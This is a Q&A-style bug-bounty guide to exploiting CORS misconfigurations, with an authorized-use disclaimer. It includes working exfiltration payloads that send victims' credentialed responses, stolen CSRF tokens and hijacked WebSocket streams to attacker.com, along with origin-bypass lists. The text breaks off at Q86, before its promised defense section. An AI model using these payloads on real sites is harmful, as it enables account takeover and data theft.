# CORS Misconfiguration — Zero to Expert (Q&A, Bug-Bounty / Red-Team Edition)

> A complete, in-depth study + field reference for **Cross-Origin Resource Sharing (CORS) misconfiguration** — from
> "what is the Same-Origin Policy" to credentialed cross-origin secret theft, account takeover, preflight/write abuse,
> CORS cache poisoning, Cross-Site WebSocket Hijacking, and RCE chains. Q&A format, progressive difficulty. Covers the
> headers, the ACAO-logic models, every bypass (reflection / `null` / regex / suffix-prefix / trusted-subdomain),
> exploitation, tooling, methodology, real-world patterns, **and** defense.
>
> ⚖️ **Authorized use only.** Bug bounty (in-scope), sanctioned pentests, CTFs, and learning. Prove the cross-origin
> read **in a real browser with your OWN test accounts**, exfil to **your** collector, **redact** secrets, take PoC
> pages down, and never test systems you don't have written permission to test.

**Canonical references** (cited throughout — real and worth reading in full):
- PortSwigger Web Security Academy — *Cross-origin resource sharing (CORS)* (+ labs) and *Cross-site WebSocket hijacking*
- OWASP — *CORS OriginHeaderScrutiny* / *Testing Cross Origin Resource Sharing* (WSTG) + CORS Cheat Sheet
- HackTricks — *CORS bypass*
- PayloadsAllTheThings — *CORS Misconfiguration*
- MDN — *CORS* and *HTTP Access-Control-* headers · CWE-942 (Permissive Cross-domain Policy) / CWE-346 (Origin Validation Error)
- Companion kit in this repo: `Web/CORS/` (guide + arsenal + checklist + report template + `poc/`)

---

## TABLE OF CONTENTS
- **Level 0 — Fundamentals (SOP, CORS, the headers)** (Q1–Q10)
- **Level 1 — Recon & baseline** (Q11–Q20)
- **Level 2 — ACAO logic & bypasses** (Q21–Q36)
- **Level 3 — Preflight & non-simple requests** (Q37–Q46)
- **Level 4 — Exploitation by impact (theft, ATO, writes)** (Q47–Q66)
- **Level 5 — Advanced: cache poisoning, CSWSH & expert chains** (Q67–Q80)
- **Tooling** (Q81–Q85)
- **Black-box methodology & checklist** (Q86–Q89)
- **Cheat sheets** (Q90–Q94)
- **Real-world patterns & references** (Q95–Q97)
- **Defense — secure CORS** (Q98–Q100)

---

# LEVEL 0 — FUNDAMENTALS

### Q1. What is the Same-Origin Policy (SOP) in one breath?
A browser security boundary: a page on `evil.com` **can send** a request to `api.target.com` (and the browser will include the victim's cookies if credentials are requested) but **cannot read** the response — the browser blocks the read unless the responding server explicitly opts in. "Origin" = scheme + host + port (`https://app.target.com:443`).

> *Plain version:* your browser is a **librarian holding the victim's private file** (their `target.com` login). A page from `evil.com` may *ask* the librarian to fetch target.com's data, but the librarian won't *read the answer aloud* to a stranger — that refusal is SOP. The subtle part: `evil.com` can still make the *request* happen (which is why CSRF exists), it just can't *see the reply*. CORS is the target server handing the librarian a note that says "reading my replies aloud to these specific sites is fine."

### Q2. What is CORS, then?
CORS is the server's **opt-in** to relax SOP: response headers (chiefly `Access-Control-Allow-Origin`) tell the browser "this *other* origin is allowed to read my responses." A CORS **misconfiguration** is the server wrongly opting in an attacker-controlled origin — so `evil.com` can read responses it shouldn't.

### Q3. Which headers actually matter?
**Response (server decides if the other origin may read):** `Access-Control-Allow-Origin` (ACAO — which origin), `Access-Control-Allow-Credentials: true` (ACAC — may the read include cookies/Authorization? **the multiplier**), `Access-Control-Allow-Methods` (ACAM — preflight), `Access-Control-Allow-Headers` (ACAH — preflight), `Access-Control-Expose-Headers` (which response headers JS may read), `Access-Control-Max-Age` (preflight cache). **Request:** `Origin:` (the calling page's origin — you control this in your PoC).

### Q4. What are the only combinations that pay?
```
VULNERABLE  → ACAO: https://evil.com (reflected/attacker-controlled)  +  ACAC: true  → read CREDENTIALED secrets ⭐
SOMETIMES   → ACAO: *  + NO credentials → read only PUBLIC data (Info unless sensitive & auth-less)
NEVER VALID → ACAO: *  + ACAC: true → browsers REJECT the pair; you cannot use it for credentials
NOT A BUG   → ACAO: https://app.target.com (a fixed, correct value) → working as intended
```

### Q5. Why can't `*` be used with credentials?
By spec, browsers **refuse** to expose a credentialed response when `Access-Control-Allow-Origin` is the literal wildcard `*`. So `*` only ever lets you read responses the server returns to **anyone unauthenticated**. People over-report bare `*`; it's usually **Informational**. The money bug is **origin *reflection* (or `null`) + `ACAC:true`**.

> *Plain version:* `*` means "any site may read this" — but browsers hard-block pairing "any site" with "include the victim's login." It's a deliberate safety rule: the two can't coexist. So a bare `ACAO: *` can only ever hand out the *logged-out* version of a page (no secrets), which is why reporting it alone almost always gets closed as Info. The exploitable pattern is when the server **echoes your specific origin** back (reflection) alongside `ACAC: true` — that combo *is* allowed, and it's the one that leaks logged-in secrets.

### Q6. Why does CORS misconfiguration pay so well?
Because it **defeats SOP for the attacker without needing XSS on the target**: a permissive credentialed CORS lets `evil.com` read the victim's **authenticated** response — typically `/api/me`, `/account`, `/api/keys`, `/graphql` — which holds a **session token, API key, PII, or CSRF token**. Read it cross-origin → impersonate the victim → **account takeover**.

### Q7. What's the #1 mistake — the "reflection vs read" rule?
Reporting a reflected `Access-Control-Allow-Origin` as the finding. **Reflection is a condition, not impact.** A reflected origin **without** `ACAC:true`, or on a response with **no secret**, is Info. The finding is *reading another logged-in user's real secret cross-origin* — ideally one that grants ATO.

> *Plain version:* "the header came back with my origin in it" is a *symptom*, not a *bug* — like noticing a door is unlocked. What matters is whether there's anything worth stealing *behind* the door and whether the door hands it over *with the victim's login attached*. Always chase all three — my origin trusted **+** credentials allowed **+** a real secret in the body — before you call it a finding.

### Q8. `Access-Control-Allow-Origin` reflects my origin — am I done?
No. You need **three** things: (1) an **attacker-controlled** origin (or `null`) reflected, (2) **`ACAC:true`**, and (3) a response **body that contains a secret**. Confirm all three (log in as your test account and check the body actually holds a token/PII) before you get excited.

### Q9. Is `Origin: null` a real thing I can exploit?
Yes. `null` is a legitimate origin the browser sends from **sandboxed iframes**, `data:`/`file:` documents, and some redirects. Many allowlists naively include `null`. If the server reflects `ACAO: null` + `ACAC:true`, **any** attacker can forge `null` (via a sandboxed iframe) and steal credentialed data. Always test `Origin: null`.

> *Plain version:* the trap with `null` is that it *looks* like a safe thing to allowlist ("that's just local file testing") — but any attacker can *make their page report `null`* on demand by running the fetch inside a sandboxed iframe. So "allow `null` + credentials" isn't a narrow local-testing convenience; it's "allow literally anyone." That's why it's every bit as dangerous as reflecting all origins.

### Q10. What's the minimum to learn before testing CORS?
How to set the `Origin` request header (Burp/curl — browsers won't let you spoof it), how to read ACAO/ACAC, the difference between a **simple** and a **preflighted** request, and how to host a small `fetch()` exfil page on an origin you control. Plus: curl proves the *header* condition, but only a **browser `fetch()`** proves the *exploit*.

---

# LEVEL 1 — RECON & BASELINE

### Q11. Which endpoints should I hunt for?
Authenticated, **secret-bearing** ones: `/api/me`, `/account`, `/profile`, `/api/keys`, `/api/tokens`, `/oauth/token`, `/session`, `/api/csrf`, `/graphql`, `/api/v*/users/me`. Anything returning a token/API key/email/CSRF token/balance — and that also sets an `Access-Control-Allow-*` header.

### Q12. How do I discover CORS endpoints at scale?
Add `Origin: https://evil.com` to **every** request (Burp Match-and-Replace / a session rule), browse the app, then filter proxy history for responses containing `access-control-allow-origin: https://evil.com`. Or bulk-probe a URL list (`poc/cors_scan.py`, Corsy, CORScanner, `nuclei -tags cors`). Grep JS for `withCredentials`/`credentials:'include'`/`fetch('/api…')` — those endpoints are built for cross-origin reads.

### Q13. What's the baseline test on a candidate?
Send your origin and read what comes back:
```bash
curl -s -D - -o /dev/null -H "Origin: https://evil.com" https://api.target.com/api/me | grep -i 'access-control'
```
Interpret: ACAO reflects `evil.com`? `ACAC: true` present? (and separately) does the **authenticated** body hold a secret?

### Q14. How do I read the ACAO responses correctly?
```
ACAO: https://evil.com   → reflected your origin → strong candidate (check ACAC + body)
ACAO: *                  → wildcard → public read only; can't carry credentials
ACAO: https://target.com → static trusted value → not your origin → not (yet) exploitable
(no ACAO header)         → SOP fully enforced → no CORS bug here
ACAC: true               → THE multiplier — combined with reflected/null origin + a secret body = the bug
```

### Q15. The body has no secret — does the bug matter?
Much less. A reflected origin + `ACAC:true` on a response that returns nothing sensitive is **Low**. Look for a **sibling endpoint** with the same policy that *does* return a token/PII/CSRF token — that's the reportable one.

### Q16. Why must I confirm with a real browser, not just curl?
`curl` ignores SOP entirely, so a reflected header in curl is **evidence of the condition**, not proof of browser exploitability. Triagers want the actual cross-origin `fetch()` read working in a browser (with credentials) reading a second test account's data. Build `poc/exfil.html`.

### Q17. Should I test subdomains separately?
Yes — `api.`, `app.`, `admin.`, `dev.`, `staging.`, `internal.` each may have its **own** CORS policy. The dev/staging API often has a looser policy and mirrors prod data.

### Q18. Does GraphQL change anything?
It's a prime target: one credentialed read of `viewer { apiToken, email, … }` can dump the whole account. If the `/graphql` endpoint relaxes CORS + `ACAC:true`, a single cross-origin read = full account data.

### Q19. What does the baseline tell me to do next?
- ACAO == my evil origin **and** `ACAC:true` **and** secret body → go straight to exfil (Level 4).
- Reflected but **no** `ACAC` → only matters if the data is sensitive & auth-less (§ non-credentialed).
- `*` → public read only; check for sensitive no-auth data, else Info.
- Static/trusted only → try to get *your* origin or `null` reflected via a bypass (Level 2).

### Q20. What if there's no `Access-Control-Allow-Origin` at all?
SOP is fully enforced for that endpoint → no CORS relaxation → move on (test other endpoints/subdomains). Don't force it.

---

# LEVEL 2 — ACAO LOGIC & BYPASSES

### Q21. How do I map the server's ACAO decision logic?
Fire a battery of `Origin` values and record the ACAO returned:
```
https://evil.com            → reflected? → REFLECT-ANY (easiest)
null                        → ACAO: null? → NULL-ALLOWED
https://target.com.evil.com → reflected? → suffix/regex weakness
https://eviltarget.com      → reflected? → prefix/"contains" weakness
https://sub.target.com      → reflected? → trusted-subdomain (need control of a sub)
https://target.com%60.evil.com → backtick parser trick
```
The pattern of which origins are accepted reveals the rule (reflect / endsWith / startsWith / contains / regex / `*.target.com`).

### Q22. What is "reflect-any" and why is it the cleanest finding?
The server **echoes whatever `Origin` you send** into ACAO with credentials. Confirm with several distinct random origins — if each is echoed verbatim + `ACAC:true`, **any** attacker page can read credentialed responses. No bypass needed; this *is* the bug.

> *Plain version:* "reflect-any" = the server does zero real checking — whatever origin you claim, it copies straight into the "you're allowed" header. It's the CORS equivalent of a bouncer who lets you in because you wrote your own name on the guest list. Test it with a couple of made-up domains: if `https://a1b2c3.example` comes back trusted too, it's genuinely reflecting everything, and you already control a trusted origin — no bypass work needed.

### Q23. How do I exploit `Origin: null`?
Host a page with a **sandboxed iframe** (no `allow-same-origin`) — its document's origin is `null` — that runs the credentialed `fetch`:
```html
<iframe sandbox="allow-scripts" srcdoc="<script>fetch('https://api.target/me',{credentials:'include'}).then(r=>r.text()).then(d=>parent.postMessage(d,'*'))<\/script>"></iframe>
<script>onmessage=e=>navigator.sendBeacon('https://attacker.com/x',e.data)</script>
```
Devs think `null` is "safe" (local files) — it's exploitable by any site.

### Q24. The server validates the origin against an allowlist — now what?
Defeat the specific (usually flawed) string check. Map the rule (Q21), then register/control an origin that satisfies it:
```
"endsWith target.com"   → https://nottarget.com  ·  https://eviltarget.com   (you register it)
"contains target.com"   → https://target.com.evil.com  ·  https://evil.com/target.com (path) ·  https://targetXcom (unescaped dot)
"startsWith https://target.com" → https://target.com.evil.com  ·  https://target.com.evil.com:1337
regex /target\.com/ loose/unanchored → https://target.com.evil.com
"any *.target.com"      → need a real sub you control (takeover/XSS) — can't forge from evil.com
```

### Q25. Why are unescaped dots in a regex exploitable?
A regex like `/target\.com/` that *isn't* anchored (`^…$`) matches anywhere in the origin → `https://target.com.evil.com` passes. And a dot that wasn't escaped (`target.com` written as `target.com` in regex) matches **any** character → `targetXcom` passes. Anchoring + escaping the origin regex is the fix.

> *Plain version:* two classic regex slips. (1) **Not anchored** — the pattern looks for `target.com` *anywhere* in the string instead of requiring the whole string to be exactly that, so `target.com.evil.com` (which *contains* `target.com`) sails through. (2) **Un-escaped dot** — in regex a plain `.` means "any single character," so a rule written `target.com` actually also matches `targetXcom`, `target-com`, etc. The secure version pins both ends and escapes the dots: `^https://app\.target\.com$`.

### Q26. What's the parser-confusion / backtick trick?
Browsers and servers can parse a malformed origin differently. Values like `https://target.com%60.evil.com` (backtick), `https://target.com&.evil.com`, or `https://target.com,evil.com` sometimes pass a server-side "starts with target.com" check while the browser treats the real origin as your domain. Test these in a **real browser** too.

### Q27. When the allowlist is `*.target.com`, can I still win?
Not by forging from `evil.com` — you need to **control content on a trusted subdomain**:
- **Subdomain takeover** (a dangling CNAME) → host `exfil.html` on `sub.target.com` → your page's origin *is* `*.target.com` → CORS trusts it → credentialed theft.
- **XSS on any trusted subdomain** → run the `fetch` from that origin → trusted.
The takeover/XSS + CORS chain turns two "medium-ish" bugs into one **High/Critical**.

### Q28. Are `http://` vs `https://` and ports part of the origin?
Yes — origin = scheme + host + **port**. A server that trusts `http://target.com` (downgraded scheme) or ignores the port can be abused. Test scheme/port variants; a config that reflects `http://` enables MITM/downgrade angles.

### Q29. Does case or a trailing dot matter?
Sometimes. `https://TARGET.com` (case) or `https://target.com.` (trailing dot) can slip a weak normalizer. These are edge cases — try them when exact-match seems in place but you suspect sloppy normalization.

### Q30. What's the difference between reflect-any and a static value?
Reflect-any echoes *your* origin (exploitable). A static value (`https://app.target.com`) is the app's own correct frontend — **not a bug** unless you control that origin (subdomain takeover/XSS). Don't report a static ACAO.

### Q31. Why is testing several random origins important for "reflect-any"?
To prove it's **true reflection**, not a coincidence (e.g., the one origin you tried happens to be allowlisted). If `https://a1b2c3.com`, `https://x.attacker.test`, and `https://evil.com` are all echoed verbatim, it's reflect-any — the cleanest, most reportable pattern.

### Q32. How do I know if I need a bypass at all?
If the server **reflects any** origin, you already control a trusted origin → skip straight to impact. You only need a bypass when there's an allowlist/validation in the way. Map first (Q21), then pick the minimal bypass.

### Q33. Can subdomains of *my* domain help?
Yes — for "startsWith"/"contains" checks, you control `*.attacker.com`, so `https://target.com.attacker.com` (you create that subdomain) satisfies "startsWith https://target.com" or "contains target.com" while being an origin you fully control.

### Q34. What about `Origin` from a redirect / `data:` document?
Documents loaded via certain redirects or `data:` URLs send `Origin: null`. So an open redirect or a `data:` context can produce a `null` origin you then exploit if `null` is trusted (Q23).

### Q35. How many origins should I fire, and how do I record results?
Fire the full battery (reflect-any probes, `null`, suffix/prefix/contains/regex variants, subdomain) one per request and tabulate the returned ACAO + ACAC. The kit's `poc/cors_scan.py` automates this and flags the dangerous combinations.

### Q36. What's the end-state of Level 2?
An origin **you control** (or `null`) is reflected into `Access-Control-Allow-Origin` **with `ACAC:true`** — now you can read credentialed responses. Move to exploitation.

---

# LEVEL 3 — PREFLIGHT & NON-SIMPLE REQUESTS

### Q37. What is a "simple" request vs a "preflighted" one?
A **simple** request goes directly (no preflight): method ∈ {GET, HEAD, POST}, only safelisted headers, and `Content-Type` ∈ {`x-www-form-urlencoded`, `multipart/form-data`, `text/plain`}. Anything else — `PUT`/`PATCH`/`DELETE`, a **custom header** (`Authorization`/`X-Api-Key`/`X-CSRF`), or `Content-Type: application/json` — triggers a **preflight `OPTIONS`** that must succeed first.

> *Plain version:* the browser splits cross-origin requests into "simple" (ordinary-looking: a basic GET or form POST) and "non-simple" (anything fancier — a `PUT`/`DELETE`, a custom auth header, or a JSON body). For **simple** ones it just sends the request and checks CORS on the *reply*. For **non-simple** ones it first sends a quiet "may I?" probe (an `OPTIONS` **preflight**) and only proceeds if the server says yes. Why it matters for you: the everyday secret-stealing read is a *simple* GET, so there's **no preflight in your way** — a common source of over-thinking.

### Q38. For stealing a secret, do I even need the preflight to pass?
Usually **no**. The classic theft is a credentialed **`GET`** of a JSON body that's *returned* — that's a **simple** request: the browser sends it (with cookies) and lets you read the body if `ACAO`+`ACAC` allow. You only need a permissive preflight for custom-header reads, writes, or reading response headers.

### Q39. What does the preflight actually gate?
Read the `OPTIONS` response: `Access-Control-Allow-Methods` (which methods the real request may use → `PUT`/`DELETE` writes), `Access-Control-Allow-Headers` (which custom request headers are allowed → `Authorization`, `Content-Type: application/json`), `Access-Control-Max-Age` (how long the browser caches this preflight), and `Access-Control-Expose-Headers` (which **response** headers JS may read).

### Q40. How do I test the preflight?
```bash
curl -s -D - -o /dev/null -X OPTIONS https://api.target/account \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: PUT" \
  -H "Access-Control-Request-Headers: authorization,content-type" | grep -i 'access-control'
```
Permissive = reflected `ACAO` + `ACAC:true` + `ACAM` includes PUT/DELETE + `ACAH` includes your headers.

### Q41. What does a permissive preflight unlock?
**Cross-origin reads with custom headers** (e.g., an `Authorization`/`X-Api-Key`-gated endpoint) and **credentialed writes** — a JSON/`PUT`/`DELETE` request that changes state *and* lets you read the result. Reflected origin + `ACAC:true` + permissive `ACAM`/`ACAH` = full cross-origin **read and write**.

### Q42. What is `Access-Control-Expose-Headers` and why care?
Without it, JS can only read a small safelist of **response** headers. If a secret (a token, a one-time code) lives in a custom response header and the server lists it in `Access-Control-Expose-Headers`, your cross-origin `fetch` can read it (`r.headers.get('X-Secret-Token')`). A permissive Expose-Headers widens what you can steal.

### Q43. Does `Access-Control-Max-Age` matter to an attacker?
Indirectly: it controls how long the browser caches a successful preflight. A long, permissive cached preflight means subsequent attacker requests skip the `OPTIONS` round-trip. Mostly a detail, but note it.

### Q44. How do I do a credentialed JSON write cross-origin?
```html
<script>
fetch('https://api.target/account',{method:'PUT',credentials:'include',
  headers:{'Content-Type':'application/json'},          // JSON => preflighted
  body:JSON.stringify({email:'attacker@evil.tld'})})    // own account in PoC -> ATO
 .then(r=>r.text()).then(d=>navigator.sendBeacon('https://attacker.com/x',d));
</script>
```
Works only if the preflight permits `PUT` + `Content-Type` for your origin with credentials.

### Q45. If JSON is preflighted, can I avoid the preflight for a write?
Sometimes — if the API also accepts `Content-Type: text/plain` (or form-encoded) for a JSON body, a **simple** POST avoids the preflight (the "text/plain JSON" trick, also used in CSRF). Then you don't need ACAM/ACAH at all. Test whether the API parses non-JSON content types.

### Q46. Bottom line on preflight?
Don't over-focus on it for *reads* (the secret-stealing GET is simple). Do test it when you want **custom-header reads, writes, or response-header secrets** — a permissive preflight is what turns a read-only CORS bug into full cross-origin read+write.

---

# LEVEL 4 — EXPLOITATION BY IMPACT

### Q47. What's the core exploit?
Your page on `attacker.com` makes the victim's browser fetch a **credentialed** response from the target and ships it to you:

> *Plain version:* the whole attack in one breath — a logged-in victim opens your page; your JavaScript runs `fetch(target, {credentials:'include'})` which tells the browser to attach *their* cookies, so the server replies with *their* private data; the CORS misconfig then lets your script *read* that reply (SOP would normally block it); you forward it to your server. One page visit while logged in = their secret in your hands, no XSS on the target needed.

```html
<script>
fetch('https://api.target/api/me',{credentials:'include'})   // sends victim cookies
 .then(r=>r.text())
 .then(d=>navigator.sendBeacon('https://attacker.com/collect', d));   // exfil to YOUR collector
</script>
```
The browser allowed `attacker.com` to **read** the credentialed response *only because* of the CORS misconfig — no XSS on the target needed.

### Q48. How do I prove it cleanly for a report?
Two of **your own** accounts: log in as test user A, visit `attacker.com/exfil.html` in the **same browser**, and show A's private response (their email/API key/token) arriving at your collector **from the `evil.com` origin**. Screenshot the request (with `Origin`), the vulnerable response headers, and the secret at your collector. Redact the secret value.

### Q49. How does a leaked secret become account takeover?
- **Session token / API key** → replay it (`Authorization: Bearer …` / set the cookie) → full ATO; prove it authenticates as A.
- **CSRF token** → use it to complete a protected change (email/password) → ATO.
- **Magic-link / reset token in `/api/me`** → trigger + read → ATO.
- **OAuth code/token** in a readable response → exchange it → ATO.

### Q50. CORS to defeat CSRF protection — how?
If the anti-CSRF token is in a CORS-readable endpoint (`/api/csrf`, or embedded in `/api/me`), steal it cross-origin, then submit the protected state-change *with* that token — defeating the CSRF defense entirely:

> *Plain version:* many apps stop CSRF by requiring a secret token that only the real page knows. But if that token sits in a CORS-readable endpoint, the CORS bug hands it to you — so you first *read* the victim's CSRF token cross-origin, then *replay* it with a forged "change my email" request. The CSRF protection is only as strong as the token's secrecy, and CORS just leaked it. That's how a "read-only" CORS bug turns into a state-changing account takeover.
```html
<script>fetch('/api/csrf',{credentials:'include'}).then(r=>r.json()).then(t=>
 fetch('/api/email',{method:'POST',credentials:'include',
  headers:{'Content-Type':'application/json','X-CSRF-Token':t.token},
  body:'{"email":"attacker@evil.tld"}'}));</script>
```

### Q51. Direct cross-origin write — when is it possible?
When the preflight is permissive (Level 3): an attacker page performs authenticated `POST`/`PUT`/`DELETE` and reads the result — full CSRF *with response reading*. Combine with a CORS-readable token if the endpoint is token-protected.

### Q52. What if the body has a secret but there's no `ACAC`?
Then the browser won't include the victim's cookies in the JS-readable request → you read **your own/unauth** data, not theirs. It only matters if the data is **sensitive and served without auth** (an internal/pre-prod API) — judge by what the body exposes.

### Q53. Does `ACAO: *` ever pay?
Only for **sensitive data served without credentials**: an internal/admin/metrics endpoint, a pre-prod API mirroring prod data, or data gated only by network position (intranet) that any site can read from a victim's browser. Otherwise `*` is **Info**.

### Q54. What's the severity of a credentialed read → ATO?
**High–Critical.** A single visit to an attacker page silently reads any logged-in user's secret → full account takeover (token/key) or mass PII theft. `CVSS ~ AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N`. UI:R because the victim must visit your page (some programs drop it given the low bar).

### Q55. Which CWE?
**CWE-942** (Permissive Cross-domain Policy) / **CWE-346** (Origin Validation Error), plus the outcome CWE (CWE-200 info exposure, CWE-384 session, CWE-352 if you chain CSRF).

### Q56. What if I can only read my own data cross-origin?
That's not a finding (the app trusting itself / reading your own data is normal). You must read **another logged-in user's** data — demonstrate with a *second* test account.

### Q57. How do I exfiltrate the data safely?
Send it to **your own** collector (webhook.site / your server) and **redact** the secret in the public report (show prefix + length + enough to prove it's the victim's token/PII). Never read a real third party's data; never mass-harvest; take the exfil page down after.

### Q58. What's the strongest possible CORS outcome?
A reflected/`null` origin + `ACAC:true` on an endpoint returning a **session token or API key** → replay → ATO of **any** logged-in victim. If the leaked secret is a **cloud/admin/CI credential**, it climbs further (Level 5 RCE chain).

### Q59. Can CORS leak a JWT, and does that matter?
Yes — a CORS-readable response often contains the JWT. Take it to the JWT kit: inspect `alg`/claims, test `alg:none`/algorithm confusion, or just replay it. A stolen JWT = ATO.

### Q60. How do I read a secret that's in a response header?
Only if `Access-Control-Expose-Headers` lists it. Then `fetch(...,{credentials:'include'}).then(r => r.headers.get('X-Secret-Token'))` reads it cross-origin (Q42).

### Q61. What about reading non-JSON responses (HTML/XML)?
You can read any body type with `r.text()`. If a credentialed HTML page contains the CSRF token or PII inline, parse it from the text. The content type doesn't protect it once CORS allows the read.

### Q62. Does the victim need to be logged in?
For the **credentialed** theft, yes — the value comes from the victim's authenticated session (cookies sent via `credentials:'include'`). That's why you target endpoints that return *the victim's* data. (Non-credentialed `*` on sensitive no-auth data doesn't need login.)

### Q63. Can I chain CORS read of an API key into more?
Yes — use the stolen API key against other endpoints (scope/privilege escalation), or feed it to the next kit (it may unlock admin features, cloud, etc.). A leaked key is rarely "just" the one endpoint.

### Q64. What's the role of the `poc/exfil.html` / `null_iframe.html` files?
`exfil.html` is the credentialed read PoC for reflect-any/bypass origins; `null_iframe.html` is the sandboxed-iframe variant for `null`-trusting servers. Host on the reflected origin, visit logged-in as your test account, confirm the secret reaches your collector.

### Q65. How do I avoid over-claiming severity?
If there's no `ACAC` and the data isn't sensitive → not Critical (Low/Info). If only `*` on public data → Info. Lead with the **secret you read** and its **impact**, calibrated honestly.

### Q66. What's the one-line success criterion?
*"My attacker origin (or `null`) is trusted **with credentials**, and from it I read `<a real secret>` belonging to another logged-in user — ideally one that grants account takeover."* If you can't say that, it's a condition, not an exploit.

---

# LEVEL 5 — ADVANCED: CACHE POISONING, CSWSH & EXPERT CHAINS

### Q67. What is CORS response cache poisoning?
When the server **reflects `Origin`** into ACAO and the response is **cached** (CDN/proxy) **without `Vary: Origin`**, the cache stores one response (with *your* origin in ACAO) and serves it to **everyone**. An attacker poisons the cache so the attacker-trusting ACAO is served to all users (mass cross-origin theft), or so the legitimate frontend's CORS breaks (DoS).

### Q68. How do I detect/confirm CORS cache poisoning?
```
1) Origin: https://evil.com → response reflects ACAO: https://evil.com AND has Age/X-Cache/Cache-Control:public AND no Vary: Origin
2) clean request (no Origin) to the SAME url → does it return ACAO: https://evil.com from cache?
POISONED if step 2 serves the reflected evil.com ACAO. Prove on a benign/unique cache key; confirm unkeyed with Param Miner.
```
Cross-reference the Host-Header kit's web-cache-poisoning methodology.

### Q69. What is Cross-Site WebSocket Hijacking (CSWSH)?
WebSockets **don't honor SOP or CORS**. A `wss://` handshake is an HTTP `Upgrade` that carries the victim's cookies and isn't gated by ACAO. If the WS endpoint is **cookie-authenticated** and the handshake **doesn't validate `Origin`**, an attacker page can open a fully-authenticated cross-origin WebSocket as the victim → read their stream and act as them.

> *Plain version:* WebSockets (the live connection behind chat/notifications) have a blind spot: **CORS doesn't apply to them at all.** When your evil page opens `new WebSocket('wss://target/chat')`, the browser still sends the victim's cookies, and nothing like ACAO stops you reading the messages. The server's *only* guard is to check the `Origin` header on the opening handshake — and teams who carefully hardened their CORS routinely forget the socket. If it's unchecked, you get a fully logged-in connection to the victim's live feed from your page. Think "CORS theft, but over a WebSocket nobody guarded" (CWE-1385).

### Q70. How do I test and exploit CSWSH?
Confirm: replay the WS handshake with `Origin: https://evil.com` (Burp Repeater WS / wscat) — does the authenticated upgrade still succeed (101)? Exploit:
```html
<script>const ws=new WebSocket('wss://target.com/chat');
ws.onopen=()=>ws.send('{"action":"getMessages"}');
ws.onmessage=e=>navigator.sendBeacon('https://attacker.com/exfil',e.data);</script>
```
Many "CORS-safe" apps forget the WS endpoint entirely. Severity is like a credentialed read (High–Critical).

### Q71. Chain: subdomain takeover → CORS.
If CORS trusts only `*.target.com` and recon found a **dangling CNAME** subdomain, claim it (subdomain takeover), host `exfil.html` there, and now your page *is* a trusted origin → full credentialed theft. The takeover supplies the missing trusted origin.

### Q72. Chain: XSS on a trusted subdomain → CORS.
A reflected/stored XSS on `app.target.com` lets you run the credentialed `fetch` **from** that trusted origin → read `api.target.com` secrets even when only `*.target.com` is allowed. Two medium bugs → one High.

### Q73. Chain: CORS → RCE / shell.
CORS doesn't execute code, but the **secret it leaks** often does:
- **Cloud credentials** in a CORS-readable response → assume the role → a cloud run-command surface → **shell** (Critical).
- **Admin API key / admin session** → an admin code-exec/import/template feature → web shell → RCE.
- **CI/source-control token** → poison a pipeline → supply-chain RCE.
Always ask "does this leaked value let me run a command anywhere?" Demonstrate on your own tenant; validate live creds read-only.

### Q74. Chain: CORS-leaked token → JWT/SSRF/other kits.
A leaked JWT → JWT kit (forge/replay). A leaked internal URL/host → SSRF target list. A leaked upload/signed-URL secret → FileUpload kit. Treat the CORS read as an **input to another kit**.

### Q75. Open redirect + CORS?
An open redirect on the target's own domain can source a `null` origin (redirected/`data:` documents) or help satisfy a same-origin check, then bounce to your exfil — a way to obtain a trusted/`null` origin you couldn't otherwise.

### Q76. Internal `*` + SSRF?
An internal `*`-CORS service that returns sensitive data, reached via SSRF, can be read (rare but high). The combination of "reaching it at all" (SSRF) and "any origin can read it" (`*`) is the issue.

### Q77. Why is CSWSH often higher-impact than people expect?
Because WebSockets frequently carry **real-time, sensitive** streams (chat, notifications, live data, admin consoles) and accept **commands**. A hijacked authenticated socket reads everything the victim sees and sends actions as them — full read+write, like a credentialed CORS read combined with a write primitive.

### Q78. Can CORS cache poisoning be a DoS?
Yes — poison the cache with an ACAO that **breaks** CORS for the legitimate frontend (e.g., a wrong origin), and the app's own cross-origin calls start failing for all users → availability impact. Report it as the appropriate severity for the program.

### Q79. How do I decide reflection vs read vs chain severity?
Reflection only / no creds / no secret → Low/Info. Reflection + `ACAC:true` + secret → High; secret = token/key → **Critical (ATO)**; secret = cloud/admin/CI → **Critical (RCE chain)**. CSWSH → High–Critical. Cache poisoning → High (mass) / DoS. Lead with the realized impact.

### Q80. What separates expert CORS testing from beginner?
The expert (1) ignores bare `*`/reflection and hunts **reflection/null + creds + a real secret**; (2) maps the **ACAO logic** and picks the minimal bypass; (3) understands **simple vs preflighted** and uses preflight for **reads/writes/header-secrets**; (4) tests the **adjacent** classes (cache poisoning, **CSWSH**) others miss; (5) **chains** the leaked secret to ATO/RCE; and (6) proves it in a **real browser with their own accounts**, redacts, and reports the impact — not the header.

---

# TOOLING

### Q81. Core CORS toolkit?
- **Burp/Caido** (Repeater to set `Origin`; Match-and-Replace to inject it everywhere; Param Miner for unkeyed cache inputs; Repeater WS for CSWSH).
- **curl** for fast header probes.
- **An attacker origin** you control (VPS / ngrok / GitHub Pages) + a **collector** (webhook.site / your server).
- **`poc/cors_scan.py`**, **Corsy**, **CORScanner**, **`nuclei -tags cors`** for discovery.
- **A real browser + two test accounts** to prove the credentialed read.

### Q82. How do I bulk-discover candidates?
Inject `Origin: https://evil.com` across all traffic (Burp), filter history for reflected ACAO; or run `cors_scan.py -l live_urls.txt` / `corsy -i live_urls.txt`. Treat every hit as a **candidate** — confirm a real secret + a browser read.

### Q83. Why is a real browser PoC non-negotiable?
Because curl/scanners ignore SOP — they confirm the *header*, not the *exploit*. The bounty evidence is the `fetch()` cross-origin read working in a browser with credentials, reading a second account's secret. (Scanners false-positive on reflection without creds/secret.)

### Q84. How do I test CSWSH with tooling?
Burp Repeater's WebSocket mode (re-send the handshake with a forged `Origin`), or `wscat`/a script. A 101 upgrade that yields an authenticated socket = CSWSH. Then a browser PoC (`poc/cswsh.html`) demonstrates the impact.

### Q85. How do I avoid drowning in false positives?
Only flag when **all** hold: attacker-controlled origin (or `null`) reflected, `ACAC:true`, a **real secret** in the body, and a working **browser** read with your own accounts. Everything else (bare `*`, reflection without creds/secret, `*`+`ACAC` together) is Info.

---

# BLACK-BOX METHODOLOGY & CHECKLIST

### Q86. Step-by-step methodology.
1. **Recon**: find endpoints returning `Access-Control-Allow-*`, prioritise authenticated secret-bearing ones.
